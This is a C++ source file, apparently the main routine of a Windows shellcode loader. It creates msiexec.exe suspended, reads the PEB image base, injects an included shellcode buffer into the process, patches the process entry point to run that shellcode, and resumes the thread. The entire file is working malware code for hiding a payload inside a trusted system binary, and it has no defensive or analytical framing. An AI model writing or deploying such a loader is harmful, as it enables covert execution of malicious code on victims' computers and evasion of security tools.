#include "CryShell.h"
#include "CryInject.h"
#include "NativeAPI.h"
#include <iostream>
#include "CryShell.c"

using namespace std;

int main() {
	SIZE_T shellsize = sizeof(CryShell);
	cout << "[!]ShellSize is " << shellsize << endl;
	WCHAR TargetProcess[] = L"C:\\Windows\\System32\\msiexec.exe";
	LPSTARTUPINFOW startinf = new STARTUPINFOW();
	LPPROCESS_INFORMATION procinf = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* procbasinf = new PROCESS_BASIC_INFORMATION();

	if (!CreateProcess(NULL, (LPWSTR)TargetProcess, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startinf, procinf)) {
		cerr << "[-]Failed to Create MSIEXEC Process. " << GetLastError() << endl;
		return -1;
	}
	cout << "[+]Create msiexec.exe in suspend state success!" << procinf->dwProcessId << endl;

	HANDLE hProcess = procinf->hProcess;
	DWORD returnLenth = 0;
	NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, procbasinf, sizeof(PROCESS_BASIC_INFORMATION), &returnLenth);
	if (!NT_SUCCESS(status)) {
		cerr << "[-]Failed to Query Process Basic Information 0x" << status << endl;
		TerminateProcess(hProcess, 0);
		return -2;
	}
	DWORD64 pebImageBaseOffset = (DWORD64)procbasinf->PebBaseAddress + 0x10;
	SIZE_T bytesRead = 0;
	DWORD64 BaseAddress = NULL;
	if (!ReadProcessMemory(hProcess, (LPCVOID)pebImageBaseOffset, &BaseAddress, sizeof(INT64), &bytesRead)) {
		cerr << "[X]Failed to Read Image PEB BaseAddress." << GetLastError() << endl;
		TerminateProcess(hProcess, 0);
		return -3;
	}

	PVOID shellcodeaddress = CryShellInject(hProcess, CryShell, shellsize);
	if (shellcodeaddress == NULL) {
		cerr << "[-]Failed to inject shellcode " << GetLastError() << endl;
		TerminateProcess(hProcess, 0);
		return -4;
	}
	PVOID address = CryEntryPatch(hProcess,(LPVOID)BaseAddress,shellcodeaddress);
	if (address == NULL) {
		cerr << "[-]Failed to Patch Process Entry " << GetLastError() << endl;
		TerminateProcess(hProcess, 0);
		return -5;
	}
	
	cout << "[!]Resume Thread." << endl;
	ResumeThread(procinf->hThread);
	return 0;
}